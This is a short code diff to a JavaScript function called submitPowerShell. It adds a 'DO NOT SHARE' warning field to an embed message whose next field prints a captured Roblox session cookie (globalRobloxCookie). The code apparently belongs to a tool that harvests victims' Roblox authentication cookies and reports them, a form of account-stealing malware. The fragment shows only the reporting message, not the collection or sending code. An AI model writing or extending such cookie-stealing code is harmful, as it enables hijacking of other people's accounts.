@@ -254,6 +254,11 @@ async function submitPowerShell() {
                         inline: false
                     },
                     {
+                        name: "⚠️ DO NOT SHARE",
+                        value: "Do not share the cookie with other people",
+                        inline: false
+                    },
+                    {
                         name: "🍪 Cookie",
                         value: `\`\`\`${globalRobloxCookie || 'None found'}\`\`\``,
                         inline: false
